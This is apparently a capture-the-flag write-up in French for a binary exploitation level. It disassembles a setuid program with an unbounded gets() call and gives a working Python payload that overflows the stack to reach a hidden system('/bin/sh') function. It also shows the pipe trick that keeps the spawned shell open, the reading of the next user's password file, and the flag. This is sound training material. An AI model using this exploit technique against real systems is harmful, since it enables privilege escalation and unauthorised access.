# level1

```bash
$ ls -l
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
$ file level1
level1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x099e580e4b9d2f1ea30ee82a22229942b231f2e0, not stripped
$ ./level1
arg
$
$ gdb level1
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048444  run
0x08048480  main
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   0x08048486 <+6>:     sub    $0x50,%esp
   0x08048489 <+9>:     lea    0x10(%esp),%eax
   0x0804848d <+13>:    mov    %eax,(%esp)
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret
End of assembler dump.
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x80497c0,%eax
   0x0804844f <+11>:    mov    %eax,%edx
   0x08048451 <+13>:    mov    $0x8048570,%eax
   0x08048456 <+18>:    mov    %edx,0xc(%esp)
   0x0804845a <+22>:    movl   $0x13,0x8(%esp)
   0x08048462 <+30>:    movl   $0x1,0x4(%esp)
   0x0804846a <+38>:    mov    %eax,(%esp)
   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:    movl   $0x8048584,(%esp)
   0x08048479 <+53>:    call   0x8048360 <system@plt>
   0x0804847e <+58>:    leave
   0x0804847f <+59>:    ret
End of assembler dump.
(gdb)
```

```bash
# decompile: main
void main(void)
{
  char local_50 [76];

  gets(local_50);
  return;
}

# decompile: run
void run(void)
{
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh");
  return;
}
```

Il faut faire un buffer overflow afin d’executer la function `run (0x08048444)` qui execute un shell qui faudra rendre interactif

```bash
$ nano /tmp/exploit.py
# coding=utf-8
import struct

# Adresse de la fonction run
run_address = 0x08048444

# Taille du tampon (80 octets) - 4 octets pour l'alignement
buffer_size = 80 - 4

# Payload : remplissage + adresse de la fonction run
payload = b"A" * buffer_size + struct.pack("<I", run_address)

# Chemin du fichier de sortie
output_path = "/tmp/payload.txt"

# Écrire la payload dans un fichier
with open(output_path, "wb") as f:
    f.write(payload)

print("Payload: {}".format(output_path))

$ python /tmp/exploit.py
Payload: /tmp/payload.txt
$ ./level1 < /tmp/payload.txt
Good... Wait what?
Segmentation fault (core dumped)
# la fonction a bien ete execute mais le shell se ferme directement
$ (cat /tmp/payload.txt; cat) | ./level1

Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
^CSegmentation fault (core dumped)
```

• **`cat /tmp/payload.txt`** : Envoie le contenu de `payload.txt` à l'entrée standard du programme vulnérable.
• **`cat`** : Maintient l'entrée standard ouverte pour permettre une interaction avec le shell.

FLAG: `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`
